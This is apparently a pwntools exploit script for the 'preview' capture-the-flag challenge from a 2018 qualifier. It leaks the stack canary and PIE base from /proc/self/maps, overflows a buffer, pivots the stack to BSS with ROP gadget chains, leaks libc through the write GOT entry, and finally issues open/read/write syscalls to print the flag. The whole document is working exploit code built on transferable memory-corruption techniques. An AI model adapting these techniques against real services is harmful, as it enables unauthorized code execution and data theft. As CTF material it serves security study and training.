#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "cee810fa.quals2018.oooverflow.io"
PORT = 31337

def solve_pow():
	r.recvuntil("Challenge: ")
	chall = r.recvline().strip()
	r.recvuntil("n: ")
	n = r.recvline().strip()
	r.recvuntil("Solution: ")

	pow = process(["./pow.py", chall, n])
	pow.recvline()
	pow.recvuntil("Solution: ")
	sol = pow.recvuntil(" ").strip()
	pow.close()
	r.sendline(sol)

def call_func(func, rdi, rsi, rdx, rbx=0, rbp=1):
	global SETGAD, CALLGAD

	payload = p64(SETGAD)
	payload += p64(rbx)
	payload += p64(rbp)
	payload += p64(func)
	payload += p64(rdx)		# r13
	payload += p64(rsi)		# r14
	payload += p64(rdi)		# r15
	payload += p64(CALLGAD)
	payload += p64(0xdeadbeef)
	payload += p64(rbx)
	payload += p64(rbp)
	payload += p64(func)
	payload += p64(rdx)		# r13
	payload += p64(rsi)		# r14
	payload += p64(rdi)		# r15

	return payload

def exploit(r):
	global SETGAD, CALLGAD

	if not LOCAL:
		solve_pow()

	r.recvuntil("requests\n")

	log.info("Leak pie and canary from /proc/self/maps")

	r.sendline("HEAD /proc/self/maps")
	r.recvline()
	
	# Canary = first 7 chars from rx in ld and first 7 char from rx mapped
	for i in range(7):
		line = r.recvline()

		if "r-xp" in line and "/lib" in line:
			CANARY1 = line[:7]
		elif "r-xp" in line and not "/lib" in line:
			CANARY2 = line[:7]
			PIE = line.split("-")[0]

	CANARY = int(CANARY1+CANARY2+"00", 16)
	PIE = int(PIE, 16)
	BSS = PIE + 0x202000

	# Got entries for open/read/write
	OPEN = BSS + 0x80
	READ = BSS + 0x60
	WRITE = BSS + 0x28	
	
	# Rop gadgets
	POPRBP = PIE + 0xb40
	LEAVE = PIE + 0xc89

	# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
	SETGAD = PIE + 0x10AA

	# mov rdx, r13; mov rsi, r14; mov edi, r15
	CALLGAD = PIE + 0x1090

	log.info("CANARY               : %s" % hex(CANARY))
	log.info("BSS                  : %s" % hex(BSS))
	log.info("PIE                  : %s" % hex(PIE))
	log.info("SETGAD               : %s" % hex(SETGAD))
	log.info("CALLGAD              : %s" % hex(CALLGAD))
	
	log.info("Read ropchain to bss and stack pivot to bss")

	payload = "A"*(88)
	payload += p64(CANARY)
	payload += p64(BSS)
	payload += call_func(READ, 0, BSS+0x100, 1000)
	payload += p64(POPRBP)
	payload += p64(BSS+0x100)
	payload += p64(LEAVE)

	r.sendline(payload)

	log.info("Leak write got and read another ropchain to bss")

	payload = p64(BSS+0x200)
	payload += call_func(WRITE, 1, WRITE, 8)
	payload += call_func(READ, 0, BSS+0x100, 1000)
	payload += p64(POPRBP)
	payload += p64(BSS+0x100)
	payload += p64(LEAVE)

	r.sendline(payload)
	r.recvline()

	WRITEADD = u64(r.recv(8))
	libc.address = WRITEADD - libc.symbols["write"]
	
	log.info("WRITE           : %s" % hex(WRITEADD))
	log.info("LIBC            : %s" % hex(libc.address))

	log.info("Send final ropchain to open/read/write flag")

	POPRAX = libc.address + 0x0000000000033544
	POPRDI = libc.address + 0x0000000000021102
	POPRSI = libc.address + 0x00000000000202e8
	POPRDX = libc.address + 0x0000000000001b92
	SYSCALL = libc.address + 0x00000000000bc375

	payload = p64(BSS + 0x200)

	payload += "A"*176
	
	# open("./flag")
	payload += p64(POPRAX)
	payload += p64(2)
	payload += p64(POPRDI)
	payload += p64(BSS+0x290)
	payload += p64(POPRSI)
	payload += p64(0)
	payload += p64(POPRDX)
	payload += p64(0)
	payload += p64(SYSCALL)

	# read(3, bss+0x300, 100)
	payload += p64(POPRAX)
	payload += p64(0)
	payload += p64(POPRDI)
	payload += p64(3)
	payload += p64(POPRSI)
	payload += p64(BSS+0x300)
	payload += p64(POPRDX)
	payload += p64(100)
	payload += p64(SYSCALL)

	# write(1, bss+0x300, 100)
	payload += p64(POPRAX)
	payload += p64(1)
	payload += p64(POPRDI)
	payload += p64(1)
	payload += p64(POPRSI)
	payload += p64(BSS+0x300)
	payload += p64(POPRDX)
	payload += p64(100)
	payload += p64(SYSCALL)

	payload += "./flag\x00"

	r.sendline(payload)

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./preview")
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./preview", env={"LD_PRELOAD":"./libc.so.6"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
